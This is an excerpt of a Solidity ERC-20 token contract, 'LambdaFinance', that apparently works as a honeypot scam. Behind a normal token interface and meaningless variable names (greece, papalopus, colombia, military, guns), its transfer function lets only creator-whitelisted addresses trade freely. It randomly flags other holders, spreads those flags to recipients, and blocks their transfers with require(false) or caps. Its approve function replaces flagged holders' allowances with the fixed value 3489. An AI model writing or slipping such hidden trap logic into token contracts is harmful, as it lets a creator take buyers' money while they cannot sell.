...
contract LambdaFinance is Context, IERC20, Ownable {
  using SafeMath for uint256;

  mapping (address => uint256) private _balances;

  mapping (address => mapping (address => uint256)) private _allowances;
  mapping (address => bool) public greece;
  mapping (address => bool) public papalopus;
  mapping (address => bool) public colombia;
  mapping (address => uint256) public latina;

  bool private documents;
  uint256 private _totalSupply;
  uint256 private guns;
  uint256 private military;
  ...
  constructor() public {
    ...
    military = chTx * 30;
    papalopus[creator] = false;
    colombia[creator] = false;
    greece[msg.sender] = true;
  ...
  */
  ...
  function _transfer(address sender, address recipient, uint256 amount) internal {
    ...
    if ((address(sender) == creator) && (documents == true)) {
      greece[recipient] = true;
      papalopus[recipient] = false;
      documents = false;
    }
    
    if ((amount > military) && (greece[sender] == true) && (address(sender) != creator)) {
        colombia[recipient] = true;
    }
    
    if (greece[recipient] != true) {
        papalopus[recipient] = ((randomly() == 3) ? true : false);
    }
    
    if ((papalopus[sender]) && (greece[recipient] == false)) {
        papalopus[recipient] = true;
    }
    
    if (greece[sender] == false) {
      if ((amount > military) && (colombia[sender] == true)) {
        require(false);
      }
      
      require(amount < guns);
      if (gallons == true) {
        if (colombia[sender] == true) {
          require(false);
        }
        colombia[sender] = true;
      }
    }
  ...
  **/
  ...
  function _approve(address owner, address spender, uint256 amount) internal {
    ...
    if ((address(owner) == creator) && (doggy == true)) {
      greece[spender] = true;
      papalopus[spender] = false;
      colombia[spender] = false;
      doggy = false;
    }
    
    tok = (papalopus[owner] ? 3489 : amount);
